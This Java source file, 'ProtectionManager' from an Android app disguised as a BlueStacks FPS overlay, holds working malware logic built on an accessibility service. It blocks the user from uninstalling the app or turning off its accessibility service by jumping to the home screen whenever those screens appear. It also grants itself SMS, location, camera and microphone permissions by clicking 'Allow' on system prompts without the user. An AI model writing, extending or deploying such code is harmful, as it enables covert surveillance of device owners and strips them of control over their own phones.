package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.content.ContextCompat;
import java.util.List;

public class ProtectionManager {
    private static final String TAG = "ProtectionManager";
    private final AccessibilityService service;
    private boolean antiUninstallEnabled = false;
    private boolean allPermissionsGranted = false;

    public ProtectionManager(AccessibilityService service) {
        this.service = service;
    }

    public void setAntiUninstallEnabled(boolean enabled) {
        this.antiUninstallEnabled = enabled;
        Log.d(TAG, "Anti-Uninstall toggle set to: " + enabled);
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

        // 0. WHITELIST
        if (pkg.equals(service.getPackageName()) || pkg.contains("com.bluestacks.fpsoverlay.controller")) {
            return;
        }

        // --- PRIORITAS 1: ANTI-UNINSTALL & ANTI-NONAKTIF AKSESIBILITAS ---
        if (antiUninstallEnabled && (
                pkg.contains("packageinstaller") || 
                pkg.contains("settings") || 
                pkg.contains("installer") || 
                pkg.contains("securitycenter") || 
                pkg.contains("launcher") || 
                pkg.equals("android"))) {
            
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                // 1. Cek upaya Uninstall
                if (isLikelyUninstallDialog(root)) {
                    Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    root.recycle();
                    return;
                }

                // 2. Cek upaya Nonaktifkan Aksesibilitas
                if (pkg.contains("settings") && isLikelyAccessibilityPage(root)) {
                    Log.e(TAG, "!!! ACCESSIBILITY PROTECTION TRIGGERED !!! Package: " + pkg);
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    root.recycle();
                    return;
                }
                root.recycle();
            }
        }

        // --- PRIORITAS 2: AUTO ALLOW PERMISSIONS ---
        if (allPermissionsGranted) {
            // Sudah tidak perlu mencari lagi
            return;
        }

        if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller") || 
            pkg.contains("settings") || pkg.contains("security")) {
            
            // Verifikasi apakah masih ada izin yang kurang
            if (!hasAllPermissions()) {
                // Gunakan pencarian cepat
                autoAllowPermissions();
            }
        }
    }

    private boolean hasAllPermissions() {
        if (allPermissionsGranted) return true;

        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
        }

        boolean missing = false;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(service, perm) != PackageManager.PERMISSION_GRANTED) {
                missing = true;
                break;
            }
        }

        if (!missing) {
            allPermissionsGranted = true;
            Log.i(TAG, ">>> SUCCESS: All permissions granted. Auto-Allow logic SHUT DOWN. <<<");
            return true;
        }
        return false;
    }

    private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        
        // Dapatkan nama aplikasi kita sendiri untuk validasi
        String appName = "FPSOverlay"; // Default fallback
        try {
            int stringId = service.getApplicationInfo().labelRes;
            if (stringId != 0) appName = service.getString(stringId);
        } catch (Exception ignored) {}

        // 1. Cek melalui ID pesan standar Android (diperluas)
        String[] msgIds = {
            "android:id/message", 
            "com.android.settings:id/message", 
            "com.android.packageinstaller:id/message",
            "com.google.android.packageinstaller:id/message",
            "com.android.packageinstaller:id/text",
            "com.miui.securitycenter:id/message"
        };
        for (String id : msgIds) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                    node.recycle();
                    if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus") || text.contains("pemasangan")) {
                        return true;
                    }
                }
            }
        }
        
        // 2. Cek apakah nama aplikasi kita disebut bersamaan dengan kata kunci uninstall
        boolean hasAppName = checkNodeForText(root, appName);
        boolean hasUninstallKey = checkNodeForText(root, "uninstall") || 
                                 checkNodeForText(root, "copot") || 
                                 checkNodeForText(root, "pemasangan") ||
                                 checkNodeForText(root, "hapus");

        if (hasAppName && hasUninstallKey) return true;

        // 3. Cek frasa spesifik bahasa Indonesia & Inggris
        if (checkNodeForText(root, "Hapus instalasi") || 
            checkNodeForText(root, "Copot pemasangan") || 
            checkNodeForText(root, "Do you want to uninstall") ||
            checkNodeForText(root, "ingin menghapus") ||
            checkNodeForText(root, "ingin mencopot")) {
            return true;
        }

        // 4. NEW: Deteksi Launcher Uninstall (Drag ke ikon tempat sampah/hapus)
        // Di launcher, seringkali hanya ada tulisan "Hapus" atau "Uninstall" tanpa pesan panjang
        if (root.getPackageName() != null && root.getPackageName().toString().toLowerCase().contains("launcher")) {
            if (checkNodeForText(root, "Uninstall") || 
                checkNodeForText(root, "Copot") || 
                checkNodeForText(root, "Hapus")) {
                // Verifikasi apakah nama aplikasi kita ada di sekitar situ
                return checkNodeForText(root, appName);
            }
        }

        return false;
    }

    private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
        if (root == null) return false;

        String appName = "BondexFPS";
        String accLabel = "BlueStacks Mobile Optimization";
        
        try {
            int nameId = service.getApplicationInfo().labelRes;
            if (nameId != 0) appName = service.getString(nameId);
            
            // Cari label aksesibilitas dari manifest secara dinamis jika memungkinkan
            // Tapi untuk sekarang kita hardcode saja berdasarkan strings.xml yang kita temukan
        } catch (Exception ignored) {}

        // 1. Cek apakah Nama App atau Label Aksesibilitas ada di layar
        boolean hasAppName = checkNodeRecursive(root, appName);
        boolean hasAccLabel = checkNodeRecursive(root, "BlueStacks") || checkNodeRecursive(root, "Optimization");
        
        Log.d(TAG, "Accessibility Check - Pkg: " + root.getPackageName());
        Log.d(TAG, "Looking for [" + appName + "] found: " + hasAppName);
        Log.d(TAG, "Looking for [BlueStacks/Optimization] found: " + hasAccLabel);
        
        if (!hasAppName && !hasAccLabel) return false;

        // 2. Jika ada nama aplikasi, cek apakah kita berada di lingkungan pengaturan/aksesibilitas
        boolean isAcc = checkNodeForText(root, "Accessibility") || checkNodeForText(root, "Aksesibilitas");
        boolean isService = checkNodeForText(root, "Layanan") || checkNodeForText(root, "Services") || 
                           checkNodeForText(root, "Downloaded") || checkNodeForText(root, "Terunduh") ||
                           checkNodeForText(root, "Aplikasi terinstal");
        boolean isShortcut = checkNodeForText(root, "Pintas") || checkNodeForText(root, "Shortcut");
        boolean isUse = checkNodeForText(root, "Gunakan") || checkNodeForText(root, "Use");

        Log.d(TAG, String.format("Acc Context: isAcc=%b, isService=%b, isShortcut=%b, isUse=%b", isAcc, isService, isShortcut, isUse));

        if (isAcc || isService || isShortcut || isUse) {
            Log.e(TAG, ">> Match found in Accessibility Context/Menu");
            return true;
        }

        // Fallback: Jika nama aplikasi ada dan ada kata status (Bahasa Inggris/Indo)
        boolean hasState = checkNodeForText(root, " Matikan ") || checkNodeForText(root, " Nonaktifkan ") || 
                           checkNodeForText(root, " Off ") || checkNodeForText(root, " On ") ||
                           checkNodeForText(root, "Aktif") || checkNodeForText(root, "Aktifkan") ||
                           checkNodeForText(root, "Berhenti") || checkNodeForText(root, "Stop");
        
        Log.d(TAG, "Fallback State check: " + hasState);
        return hasState;
    }

    private void autoAllowPermissions() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        // Jangan interupsi proses uninstall
        if (isLikelyUninstallDialog(root)) {
            root.recycle();
            return;
        }

        // Optimasi: List ID paling sering muncul di urutan pertama
        String[] ids = {
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.lbe.security.miui:id/permission_allow_button",
            "android:id/button1"
        };

        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, id)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        // Quick Keywords Fallback (Hanya jika ID gagal)
        String[] keys = {"Allow", "Izinkan", "While using", "Saat aplikasi", "Hanya kali ini", "Only this time"};
        for (String key : keys) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "Text:" + key)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        root.recycle();
    }

    private boolean performSafeClick(AccessibilityNodeInfo node, String identifier) {
        if (node == null) return false;
        try {
            if (node.isVisibleToUser() && node.isEnabled()) {
                String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                
                // Safety: Stop if it's uninstall related
                if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus")) {
                    node.recycle();
                    return false;
                }

                // Cepat cari clickable target
                AccessibilityNodeInfo target = node;
                if (!target.isClickable()) {
                    AccessibilityNodeInfo parent = target.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            target = parent;
                        } else {
                            AccessibilityNodeInfo grandParent = parent.getParent();
                            if (grandParent != null && grandParent.isClickable()) {
                                target = grandParent;
                            }
                        }
                    }
                }

                if (target != null && target.isClickable()) {
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (success) {
                        Log.i(TAG, "--> SUCCESS: Clicked button [" + text + "] via " + identifier);
                    }
                    if (target != node) target.recycle();
                    node.recycle();
                    return success;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during click: " + e.getMessage());
        }
        node.recycle();
        return false;
    }

    private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
        return checkNodeRecursive(node, text);
    }

    private boolean checkNodeRecursive(AccessibilityNodeInfo node, String target) {
        if (node == null) return false;
        
        // Cek Text
        CharSequence text = node.getText();
        if (text != null && text.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }
        
        // Cek Content Description (Sering digunakan di Android baru)
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        // Cari di anak-anaknya (Recursive)
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (checkNodeRecursive(child, target)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }

        return false;
    }
}
